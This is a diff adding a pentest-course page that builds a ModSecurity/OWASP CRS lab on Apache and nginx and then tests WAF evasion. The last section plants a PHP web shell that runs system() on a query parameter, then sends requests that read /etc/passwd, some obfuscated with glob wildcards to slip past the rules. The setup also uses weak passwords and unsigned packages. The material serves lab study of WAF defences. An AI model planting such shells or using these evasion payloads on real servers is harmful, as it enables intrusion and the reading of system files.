@@ -1,0 +1,525 @@
+.. include:: /pentest_links.txt
+
+
+.. _WAF_evasion:
+
+***********
+WAF Evasion
+***********
+
+
+What's a WAF?
+=============
+
+
+WAFs
+----
+
+From Wikipedia's `Web application firewall <https://en.wikipedia.org/wiki/Web_application_firewall>`_:
+
+  A web application firewall (or WAF) filters, monitors, and blocks HTTP traffic to and from a web application. A WAF is differentiated from a regular firewall in that a WAF is able to filter the content of specific web applications while regular firewalls serve as a safety gate between servers. By inspecting HTTP traffic, it can prevent attacks stemming from web application security flaws, such as SQL injection, cross-site scripting (XSS), file inclusion, and security misconfigurations.
+
+  In 2002, the open source project ModSecurity[7] was formed in order to make WAF technology more accessible and solve the obstacles within the industry like business cases, cost barriers, and proprietary rule-sets. ModSecurity finalized a core rule set for protecting Web Applications, based on the OASIS Web Application Security Technical Committee’s (WAS TC) vulnerability work. In 2003, their work was expanded and standardized through the Open Web Application Security Project’s (OWASP) Top 10 List, an annual ranking for web security vulnerabilities. This list would become the industry benchmark for many compliance themes.
+
+
+ModSecurity WAF for Apache, Nginx, and IIS
+------------------------------------------
+
+From Wikipedia's `ModSecurity <https://en.wikipedia.org/wiki/ModSecurity>`_:
+
+  ModSecurity, sometimes called Modsec, is a popular Open-source Web application firewall (WAF). Originally designed as a module for the Apache HTTP Server, it has evolved to provide an array of Hypertext Transfer Protocol request and response filtering capabilities along with other security features across a number of different platforms including Apache HTTP Server, Microsoft IIS and NGINX. It is a free software released under the Apache license 2.0.
+
+  Although not its only configuration, ModSecurity is most commonly deployed to provide protections against generic classes of vulnerabilities using the OWASP ModSecurity Core Rule Set (CRS). This is an Open-source set of rules written in ModSecurity's SecRules language. The project is part of OWASP, the Open Web Application Security Project. Several other rule sets are also available for ModSecurity.
+
+
+OWASP Core Rule Set for WAFs
+----------------------------
+
+From `Core Rule Set: The evolution of an OWASP Project  <https://owasp.blogspot.ch/2017/12/core-rule-set-evolution-of-an-owasp-project.html>`_:
+
+  Let me put one thing straight: there are two things when we talk about ModSecurity. There is the naked ModSecurity engine running inside NGINX or Apache and there is the rule set that instructs the engine what to do. Many different rule sets exist. But the rule set with the largest user base (and longest name) is the `OWASP ModSecurity Core Rule Set <https://www.owasp.org/index.php/Category:OWASP_ModSecurity_Core_Rule_Set_Project>`_ or CRS for short.
+
+For documentation see `OWASP Core Rule Set: Documentation <https://www.modsecurity.org/CRS/Documentation/>`_, but it currently discussed ModSecurity 2.x and not the 3.x used here.
+
+The main articles we'll discuss are `Web Application Firewall (WAF) Evasion Techniques <https://medium.com/secjuice/waf-evasion-techniques-718026d693d8>`_ and `Web Application Firewall (WAF) Evasion Techniques #2 <https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0>`_.
+
+
+WAF options
+===========
+
+
+WAF via Apache2 (simple) or nginx (hard)
+----------------------------------------
+
+Simply put, Apache2 is easy because distributions like Debian provide a pre-compiled :program:`libapache2-modsecurity` to match the distribution's :program:`apache2`. But from `Compiling and Installing ModSecurity for Open Source NGINX <https://www.nginx.com/blog/compiling-and-installing-modsecurity-for-open-source-nginx/>`_ dated August 4, 2017:
+
+  The latest version, ModSecurity 3.0, breaks new ground with a modular architecture that runs natively in NGINX. Previous versions worked only with the Apache HTTP Server. We recently released ModSecurity 3.0 as a dynamic module for NGINX Plus, but as of this writing there is no prebuilt ModSecurity dynamic module for open source NGINX. In this blog we show how to create a ModSecurity 3.0 dynamic module for use with open source NGINX.
+
+So with :program:`nginx` it's currently not as simple as installing the application - a version compatible with the distribution-provided :program:`apache2` must be compiled.
+
+
+Provisioning a VM
+-----------------
+
+We presume you will provision a Debian 9 VM on some cloud provider. We choose Debian 9 because Kali is based on Debian and Debian 9 is the newest version available on most cloud providers. Generally, Ubuntu can be used instead, and once Ubuntu 18.04 LTS is released it will become a better choice. Given that we have Linode credits to burn, we use the Linode provider, but the procedures should apply on other providers.
+
+Note that these VMs are not hardened for security - more a quick and dirty to run the ModSecurity WAF.
+
+
+Building the WAF using Apache2 (LAMP)
+=====================================
+
+
+Install the LAMP stack
+----------------------
+
+We install the LAMP stack (vs. something like the MEAN stack) simply because it's probably more familiar to readers. Of the many `Linode LAMP Guides <https://linode.com/docs/web-servers/lamp/>`_ we will follow `How to Install a LAMP Stack on Ubuntu 16.04 <https://linode.com/docs/web-servers/lamp/install-lamp-stack-on-ubuntu-16-04/>`_ on Debian 9:
+
+.. code-block:: bash
+  :emphasize-lines: 1
+
+  # Become www.example.com locally
+  IP=$(ip addr show eth0 | grep "inet\b" | awk '{print $2}' | cut -d/ -f1)
+  echo "waf-apache2" > /etc/hostname
+  hostname -F /etc/hostname
+  sed -i '1 i\'$IP'  www.example.com waf-apache2.example.com waf-apache2.localdomain waf-apache2' /etc/hosts
+  
+  # Install apache2
+  apt install apache2 -o Acquire::ForceIPv4=true -y < /dev/null
+  a2dismod mpm_event
+  a2enmod mpm_prefork
+  systemctl restart apache2
+
+  # Configure apache virtual hosts
+  cat > /etc/apache2/sites-available/example.com.conf <<'EOF'
+  <Directory /var/www/html/example.com/public_html>
+          Require all granted
+  </Directory>
+  <VirtualHost *:80>
+          ServerName example.com
+          ServerAlias www.example.com
+          ServerAdmin webmaster@localhost
+          DocumentRoot /var/www/html/example.com/public_html
+
+          ErrorLog /var/www/html/example.com/logs/error.log
+          CustomLog /var/www/html/example.com/logs/access.log combined
+  </VirtualHost>
+  EOF
+
+  mkdir -p /var/www/html/example.com/{public_html,logs}
+  a2ensite example.com.conf
+  a2dissite 000-default.conf
+  systemctl reload apache2
+
+  # Install mysql database
+  PW=password
+  apt install mysql-server -y < /dev/null
+  # change root password and answer Y
+  { echo -e "\n"; echo "Y"; echo "$PW"; echo "$PW"; yes Y; } | \
+      mysql_secure_installation
+  # Create test database and user
+  mysql -u root -p$PW
+  CREATE DATABASE webdata;
+  GRANT ALL ON webdata.* TO 'webuser' IDENTIFIED BY 'password';
+  quit
+
+  # Install php7
+  apt install php7.0 libapache2-mod-php7.0 php7.0-mysql -o Acquire::ForceIPv4=true -y < /dev/null
+  apt install php7.0-curl php7.0-json php7.0-cgi -o Acquire::ForceIPv4=true -y < /dev/null
+  # error_log = /var/log/php/error.log
+  sed -i '/;error_log = syslog/a\error_log = /var/log/php/error.log' /etc/php/7.0/apache2/php.ini 
+  # Create log directory
+  mkdir /var/log/php
+  chown www-data /var/log/php
+  systemctl restart apache2
+
+  # Add php database config file
+  PHPDIR=/var/www/html/example.com/public_html
+  cat > $PHPDIR/config.php <<'EOF'
+  <?php
+   define('DB_SERVER', 'localhost');
+   define('DB_USERNAME', 'webuser');
+   define('DB_PASSWORD', 'password');
+   define('DB_NAME', 'webdata');
+   ?>
+  EOF
+
+  # Add php page testing database password
+  cat > $PHPDIR/phptest.php <<'EOF'
+  <html>
+  <head>
+      <title>PHP Test</title>
+  </head>
+      <body>
+      <?php
+      include_once 'config.php';
+      
+      echo '<p>Hello World</p>';
+
+      // In the variables section below, replace user and password with your own MySQL credentials as created on your server
+      $servername = DB_SERVER;
+      $username = DB_USERNAME;
+      $password = DB_PASSWORD;
+
+      // Create MySQL connection
+      $conn = mysqli_connect($servername, $username, $password);
+
+      // Check connection - if it fails, output will include the error message
+      if (!$conn) {
+          die('<p>Connection failed: <p>' . mysqli_connect_error());
+      }
+      echo '<p>Connected successfully</p>';
+      ?>
+  </body>
+  </html>
+  EOF
+
+  # Make sure can connect to database
+  curl localhost/phptest.php
+
+
+Configure ModSecurity on Apache
+-------------------------------
+
+Follow `How to Configure ModSecurity on Apache <https://linode.com/docs/web-servers/apache-tips-and-tricks/configure-modsecurity-on-apache/>`_:
+
+.. code-block:: bash
+  :emphasize-lines: 1
+
+  # Working directory
+  mkdir -p ~/waf
+  cd ~/waf
+
+  # Install ModSecurity
+  apt install libapache2-modsecurity -o Acquire::ForceIPv4=true -y < /dev/null
+  systemctl restart apache2
+
+  # OWASP ModSecurity Core Rule Set
+  # Default package uses ModSecurity 2 and we want 3
+  mv /etc/modsecurity/modsecurity.conf-recommended  modsecurity.conf
+  apt install git -y < /dev/null
+  git clone https://github.com/SpiderLabs/owasp-modsecurity-crs.git
+  cd owasp-modsecurity-crs
+  mv crs-setup.conf.example /etc/modsecurity/crs-setup.conf
+  mv rules/ /etc/modsecurity/
+  # Point to OWASP rules by modify /etc/apache2/mods-available/security2.conf
+  mv /etc/apache2/mods-available/security2.conf{,.bak}
+  cat > /etc/apache2/mods-available/security2.conf <<'EOF'
+  <IfModule security2_module>
+          # Default Debian dir for modsecurity's persistent data
+          SecDataDir /var/cache/modsecurity
+          # Include all the *.conf files in /etc/modsecurity.
+          # Keeping your local configuration in that directory
+          # will allow for an easy upgrade of THIS file and
+          # make your life easier
+          IncludeOptional /etc/modsecurity/*.conf
+          Include /etc/modsecurity/rules/*.conf
+  </IfModule>
+  EOF
+
+  systemctl restart apache2
+
+
+Test ModSecurity
+----------------
+
+
+.. code-block:: bash
+  :emphasize-lines: 1
+
+  # Replace example.com.conf with test ModSecurity SecRule
+  cat > /etc/apache2/sites-available/example.com.conf <<'EOF'
+  <Directory /var/www/html/example.com/public_html>
+          Require all granted
+  </Directory>
+  <VirtualHost *:80>
+          ServerName example.com
+          ServerAlias www.example.com
+          ServerAdmin webmaster@localhost
+          DocumentRoot /var/www/html/example.com/public_html
+
+          ErrorLog /var/www/html/example.com/logs/error.log
+          CustomLog /var/www/html/example.com/logs/access.log combined
+
+          SecRuleEngine On
+          SecRule ARGS:testparam "@contains test" "id:1234,deny,status:403,msg:'Our test rule has triggered'"
+  </VirtualHost>
+  EOF
+
+  # testparam triggers WAF, testpara doesn't, and /bin/bash does
+  curl localhost/phptest.php?testparam=test
+  curl localhost/phptest.php?testpara=test
+  curl localhost/phptest.php?exec=/bin/bash
+
+
+Building the WAF using nginx (LEMP)
+===================================
+
+Look at `Nginx Server Configs <https://github.com/h5bp/server-configs-nginx>`_ to harden nginx below.
+
+
+Install ModSecurity with NGINX
+------------------------------
+
+`Compiling and Installing ModSecurity for Open Source NGINX <https://www.nginx.com/blog/compiling-and-installing-modsecurity-for-open-source-nginx/>`_
+
+.. code-block:: bash
+  :emphasize-lines: 1
+
+  # Become www2.example.com locally
+  IP=$(ip addr show eth0 | grep "inet\b" | awk '{print $2}' | cut -d/ -f1)
+  echo "waf-nginx" > /etc/hostname
+  hostname -F /etc/hostname
+  sed -i '1 i\'$IP'  www2.example.com waf-nginx.example.com waf-nginx.localdomain waf-nginx' /etc/hosts
+
+  # Install ngnix from nginx.org and not Debian
+  cat > /etc/apt/sources.list.d/nginx.list <<'EOF'
+  deb [allow-insecure=yes allow-downgrade-to-insecure=yes] http://nginx.org/packages/mainline/debian/ stretch nginx
+  deb-src [allow-insecure=yes allow-downgrade-to-insecure=yes] http://nginx.org/packages/mainline/debian/ stretch nginx
+  EOF
+
+  apt update -o Acquire::ForceIPv4=true < /dev/null
+  apt install nginx --allow-unauthenticated -o Acquire::ForceIPv4=true -y < /dev/null
+
+  # Install prereq packages needed for building software
+  apt install -o Acquire::ForceIPv4=true -y apt-utils autoconf automake build-essential git libcurl4-openssl-dev libgeoip-dev liblmdb-dev libpcre++-dev libtool libxml2-dev libyajl-dev pkgconf wget zlib1g-dev < /dev/null
+
+  # Download and compile ModSecurity
+  mkdir -p ~/waf
+  cd ~/waf
+  git clone --depth 1 -b v3/master --single-branch https://github.com/SpiderLabs/ModSecurity
+  cd ModSecurity
+  git submodule init
+  git submodule update
+  ./build.sh
+  ./configure
+  make
+  make install
+  cd ..
+
+  # Download NGINX Connector for ModSecurity and compile as dynamic module
+  git clone --depth 1 https://github.com/SpiderLabs/ModSecurity-nginx.git
+  NV=$(nginx -v 2>&1 | sed 's/^.*\///')
+  wget -4 http://nginx.org/download/nginx-${NV}.tar.gz
+  tar zxvf nginx-${NV}.tar.gz
+  cd nginx-${NV}
+  ./configure --with-compat --add-dynamic-module=../ModSecurity-nginx
+  make modules
+  cp objs/ngx_http_modsecurity_module.so /etc/nginx/modules
+
+  # Load the NGINX ModSecurity Connector Dynamic Module
+
+  # Add to top-level context in /etc/nginx/nginx.conf
+  # load_module modules/ngx_http_modsecurity_module.so;
+  sed -i '2 i\load_module modules/ngx_http_modsecurity_module.so;' /etc/nginx/nginx.conf
+
+  # Configure, enable, and test ModSecurity
+  mkdir /etc/nginx/modsec
+  wget -4 -P /etc/nginx/modsec/ https://raw.githubusercontent.com/SpiderLabs/ModSecurity/master/modsecurity.conf-recommended
+  mv /etc/nginx/modsec/modsecurity.conf-recommended /etc/nginx/modsec/modsecurity.conf
+  sed -i 's/SecRuleEngine DetectionOnly/SecRuleEngine On/' /etc/nginx/modsec/modsecurity.conf
+  # SecRequestBodyInMemoryLimit is a problem, so comment it out
+  sed -i 's/^SecRequestBodyInMemoryLimit/#SecRequestBodyInMemoryLimit/' /etc/nginx/modsec/modsecurity.conf
+
+  # Create /etc/nginx/modsec/main.conf
+  cat > /etc/nginx/modsec/main.conf <<'EOF'
+  # From https://github.com/SpiderLabs/ModSecurity/blob/master/\
+  # modsecurity.conf-recommended
+  #
+  # Edit to set SecRuleEngine On
+  Include "/etc/nginx/modsec/modsecurity.conf"
+  # Basic test rule
+  SecRule ARGS:testparam "@contains test" "id:1234,deny,status:403"
+  EOF
+
+  # Add to end of /etc/nginx/conf.d/default.conf:
+  sed -i '/^}/i\
+      # modsecurity\
+      modsecurity on;\
+      modsecurity_rules_file /etc/nginx/modsec/main.conf;' /etc/nginx/conf.d/default.conf
+
+  systemctl restart nginx
+
+  # testparam triggers WAF, testpara doesn't, and /bin/bash does
+  curl localhost/?testparam=test
+  curl localhost/?testpara=test
+  curl localhost/?exec=/bin/bash
+
+
+Add in the OWASP CRS
+--------------------
+
+`Using the OWASP CRS with the NGINX Plus with ModSecurity WAF <https://www.nginx.com/resources/admin-guide/nginx-plus-modsecurity-waf-owasp-crs/>`_
+
+.. code-block:: bash
+  :emphasize-lines: 1
+
+  # Download OWASP
+  cd ~/waf
+  wget -4 https://github.com/SpiderLabs/owasp-modsecurity-crs/archive/v3.0.2.tar.gz
+  tar -xzvf v3.0.2.tar.gz
+  mv owasp-modsecurity-crs-3.0.2 /usr/local
+  cd /usr/local/owasp-modsecurity-crs-3.0.2
+  cp crs-setup.conf.example crs-setup.conf
+  cd ~/waf
+ 
+  # Change /etc/nginx/modsec/main.conf
+  cat > /etc/nginx/modsec/main.conf <<'EOF'
+  # From https://github.com/SpiderLabs/ModSecurity/blob/master/\
+  # modsecurity.conf-recommended
+  #
+  # Edit to set SecRuleEngine On
+  Include "/etc/nginx/modsec/modsecurity.conf"
+
+  # OWASP CRS v3 rules
+  Include /usr/local/owasp-modsecurity-crs-3.0.2/crs-setup.conf
+  Include /usr/local/owasp-modsecurity-crs-3.0.2/rules/*.conf
+  EOF
+
+  systemctl restart nginx
+
+  # Nikto User-Agent triggers WAF
+  curl -H "User-Agent: Nikto" http://localhost/
+
+
+Install and configure MySQL
+---------------------------
+
+.. code-block:: bash
+  :emphasize-lines: 1
+
+  # Install mysql database
+  PW=password
+  apt install mysql-server -y < /dev/null
+  # change root password and answer Y
+  { echo -e "\n"; echo "Y"; echo "$PW"; echo "$PW"; yes Y; } | \
+      mysql_secure_installation
+  # Create test database and user
+  mysql -u root -p$PW
+  CREATE DATABASE webdata;
+  GRANT ALL ON webdata.* TO 'webuser' IDENTIFIED BY 'password';
+  quit
+
+
+Install and configure PHP
+-------------------------
+
+.. code-block:: bash
+  :emphasize-lines: 1
+
+  # Install php7
+  apt install php7.0-fpm php7.0-mysql -o Acquire::ForceIPv4=true -y < /dev/null
+  apt install php7.0-curl php7.0-json php7.0-cgi -o Acquire::ForceIPv4=true -y < /dev/null
+  # add nginx user to www-data (needed for nginx to contact php-fpm)
+  usermod -a -G www-data nginx
+  sed -i 's/^;cgi.fix_pathinfo=1.*$/cgi.fix_pathinfo=0/' /etc/php/7.0/fpm/php.ini
+  systemctl restart php7.0-fpm
+
+  # Configuration in /etc/nginx/conf.d/php.conf
+  HN=waf-nginx
+  CONF="/etc/nginx/conf.d/default.conf"
+  cat > /tmp/php.conf <<'EOF'
+      location ~ \.php$ {
+          root   /usr/share/nginx/html;
+          fastcgi_pass unix:/run/php/php7.0-fpm.sock;
+          include fastcgi_params;
+          fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
+      }
+
+      location ~ /\.ht {
+          deny all;
+      }
+  EOF
+  sed -i '/# modsecurity/r /tmp/php.conf' $CONF
+  rm /tmp/php.conf
+
+  systemctl reload nginx
+
+  # Add php database config file
+  PHPDIR=/usr/share/nginx/html
+  cat > $PHPDIR/config.php <<'EOF'
+  <?php
+   define('DB_SERVER', 'localhost');
+   define('DB_USERNAME', 'webuser');
+   define('DB_PASSWORD', 'password');
+   define('DB_NAME', 'webdata');
+   ?>
+  EOF
+
+  # Add php page
+  cat > $PHPDIR/phptest.php <<'EOF'
+  <html>
+  <head>
+      <title>PHP Test</title>
+  </head>
+      <body>
+      <?php
+      include_once 'config.php';
+      
+      echo '<p>Hello World</p>';
+
+      // In the variables section below, replace user and password with your own MySQL credentials as created on your server
+      $servername = DB_SERVER;
+      $username = DB_USERNAME;
+      $password = DB_PASSWORD;
+
+      // Create MySQL connection
+      $conn = mysqli_connect($servername, $username, $password);
+
+      // Check connection - if it fails, output will include the error message
+      if (!$conn) {
+          die('<p>Connection failed: <p>' . mysqli_connect_error());
+      }
+      echo '<p>Connected successfully</p>';
+      ?>
+  </body>
+  </html>
+  EOF
+
+  # Make sure can connect to database
+  curl localhost/phptest.php
+
+
+WAF evasion
+===========
+
+
+WAF Evasion Techniques
+----------------------
+
+Review `Web Application Firewall (WAF) Evasion Techniques <https://medium.com/secjuice/waf-evasion-techniques-718026d693d8>`_ and `Web Application Firewall (WAF) Evasion Techniques #2 <https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0>`_.
+
+Test using a PHP script running shell commands on the nginx server (which is a very dangerous thing):
+
+.. code-block:: bash
+  :emphasize-lines: 1
+
+  # Add shell command execution PHP script
+  PHPDIR=/usr/share/nginx/html
+  cat > $PHPDIR/x1y2z3.php <<'EOF'
+  <?php echo 'ok: '; print_r($_GET['c']); echo ('<br \>'); system($_GET['c']); ?>
+  EOF
+
+  # Modify configuration to add "setvar:tx.paranoia_level=..."
+  CRS=/usr/local/owasp-modsecurity-crs-3.0.2/crs-setup.conf
+  sed -i '$ s/"$/,\\/' $CRS
+  LEVEL=1
+  echo "  setvar:tx.paranoia_level=$LEVEL\"" >> $CRS
+  tail -n 5 $CRS
+
+  systemctl restart nginx
+
+  # Try paranoia levels 1-4
+  for l in 1 2 3 4; do
+    echo -e "\n\n LEVEL $l"
+    LEVEL=$l
+    sed -i '$ s/..$/'$LEVEL'"/' $CRS
+    systemctl restart nginx
+    tail -n 1 $CRS
+    echo -e "\nLEVEL $LEVEL - TRY 1\n"
+    curl localhost/x1y2z3.php?c=/bin/cat+/etc/passwd
+    echo -e "\nLEVEL $LEVEL - TRY 2\n"
+    curl localhost/x1y2z3.php?c=/???/c?t+/etc/passwd
+    echo -e "\nLEVEL $LEVEL - TRY 3\n"
+    curl localhost/x1y2z3.php?c=/???/c?t+/???/??ss??
+  done
